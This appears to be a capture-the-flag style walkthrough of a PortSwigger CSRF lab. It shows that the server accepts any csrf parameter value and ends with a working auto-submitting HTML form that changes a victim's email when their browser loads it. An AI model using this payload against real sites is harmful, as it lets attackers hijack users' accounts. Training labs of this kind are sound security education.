## LAB DESCRIPTION

<img width="936" height="508" alt="image" src="https://github.com/user-attachments/assets/88c74c7e-f30b-4431-bc3c-d8fffe11c258" />

## SOLUTION

---------------------------------------------

- Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

## Identifying how the token is used

- Login as the provided user `wiener:peter` and go to **My account** -> **Update email**.

<img width="1712" height="679" alt="image" src="https://github.com/user-attachments/assets/872d726e-a026-4585-b7aa-05d43c31a124" />

- With Burp running, change the email to a dummy email and intercept the request.

<img width="1186" height="419" alt="image" src="https://github.com/user-attachments/assets/a94731ee-c7ad-4902-bcad-6b6e461ae90b" />

-----------------------------------------------

Now we'll test the CSRF token:

- Change `CSRF` to a random value -> request is **rejected**.

  <img width="1232" height="547" alt="image" src="https://github.com/user-attachments/assets/81210a80-55f1-4090-b403-d6c3d99ba356" />

- Try changing the email parameter

  <img width="1232" height="537" alt="image" src="https://github.com/user-attachments/assets/9d095a2a-fd88-45ae-ba1e-8f269e265f2c" />

  On following up with the redirection, it can be seen that the email is now changed.

  <img width="1920" height="1152" alt="image" src="https://github.com/user-attachments/assets/e23f4a30-9730-4b50-9bff-06b6c2f29079" />

> The site only checks that `CSRF` exists, not that it has a correct non-empty value.

--------------------------------------------------

## Building the CSRF PoC HTML

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af0007904f0e6a381a8b14a00440079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Using the exploit server

Use PortSwigger's explot server to host and deliver the PoC.

1. Open the **Exploit Server** in the lab.
2. Paste the PoC HTML into the **Body** field and click **Store**.
3. Click **Deliver exploit to victim**.

<img width="1712" height="1057" alt="image" src="https://github.com/user-attachments/assets/f0652e94-4a33-41ff-847a-261dd0762107" />


The victim's browser loads the exploit, auto-submits the form with `csrf=` and their session cookie, and the lab marks as solved.
<img width="1344" height="692" alt="image" src="https://github.com/user-attachments/assets/ccc9cff5-0e8d-41aa-bba2-1949f5903395" />
